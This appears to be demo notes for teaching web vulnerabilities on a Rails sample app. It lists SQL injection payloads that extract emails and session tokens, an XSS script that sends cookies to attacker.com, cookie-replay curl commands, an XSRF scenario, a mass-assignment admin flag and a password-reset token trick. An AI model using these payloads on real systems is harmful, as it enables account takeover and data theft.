# Michael Hartl Sample App + Security Vulnerabilities
=====================================================

Setup
-----

Apache:
tail -f /var/log/apache2/access_log
Index.html - /Library/WebServer/Documents/index.html.en


SQL injection
-------------
* a' ) or 1 = 1  --  
* XXX') union select 1, email, 1, 1, 1 from users --  
* XXX') union select 1, remember_token, 1, 1, 1 from users --  

    curl "http://www.blog.com:3000/" --cookie remember_token=


CSS
---
Bob:
Check this event: <a href="http://railsisrael.events.co.il/tracks">Rails Israel</a>

Alice:
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>


curl "http://www.blog.com:3000/users" --cookie remember_token=

XSRF
----
Go to freeIpad.com as Bob
   Check Apache access log
 
    curl "http://www.blog.com:3000/microposts/7" --cookie remember_token=XXXXXXXX


Mass Asignment
--------------
user%5Badmin%5D=true


Password reset
--------------
Email:
http://www.blog.com:3000/password_resets/8/edit?token=H9fDQauceVttJ9mN7TPCoA
Change to /password_resets/6?token[]

